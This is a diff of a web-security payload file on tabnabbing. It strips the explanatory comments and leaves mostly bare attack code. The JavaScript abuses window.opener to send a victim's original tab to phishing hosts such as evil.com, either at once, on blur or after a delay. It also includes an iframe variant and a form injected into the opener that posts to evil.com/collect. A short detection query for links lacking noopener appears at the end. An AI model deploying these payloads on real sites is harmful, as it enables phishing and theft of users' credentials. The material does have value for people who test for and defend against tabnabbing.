@@ -1,29 +1,17 @@
-# ============================================================
-# Tabnabbing — Payloads & PoC
-# ============================================================
-
-# ---- Classic Tabnabbing ----
-# When user opens link in new tab, original tab can be redirected
-# Link on attacker page:
 <a href="https://target.com" target="_blank">Visit Target</a>
-# OR victim page has:
 <a href="https://attacker-site.com" target="_blank">External Link</a>
-# Attacker page JS (when opened in new tab):
 <script>
 window.onblur = function() {
     window.opener.location = "https://evil-phishing.com/login-clone";
 }
 </script>
 
-# ---- window.opener Abuse ----
-# Page opened with target="_blank" (no rel="noopener") can access opener:
 <script>
 if (window.opener) {
     window.opener.location = "https://evil.com/phishing-page";
 }
 </script>
 
-# ---- Delayed Tabnabbing ----
 <script>
 setTimeout(function() {
     if (window.opener) {
@@ -32,21 +20,12 @@ setTimeout(function() {
 }, 3000); // redirect after 3 seconds
 </script>
 
-# ---- iframe Tabnabbing ----
 <iframe src="https://target.com" onload="window.opener && (window.opener.location='https://evil.com')"></iframe>
 
-# ---- Prevention Bypass ----
-# rel="noopener noreferrer" prevents this
-# Check if links lack this attribute:
 <a href="https://evil.com" target="_blank">         <!-- VULNERABLE -->
 <a href="https://evil.com" target="_blank" rel="noopener noreferrer">  <!-- SAFE -->
 
-# ---- Reverse Tabnabbing (modern exploit) ----
-# Attacker's page (opened by victim) redirects victim's original tab:
 window.opener.document.write('<form action="https://evil.com/collect" method="POST">...');
 window.opener.document.forms[0].submit();
 
-# ---- Check for Vulnerable Links ----
-# Look for: target="_blank" without rel="noopener"
-# DOM check:
 document.querySelectorAll('a[target="_blank"]:not([rel*="noopener"])');
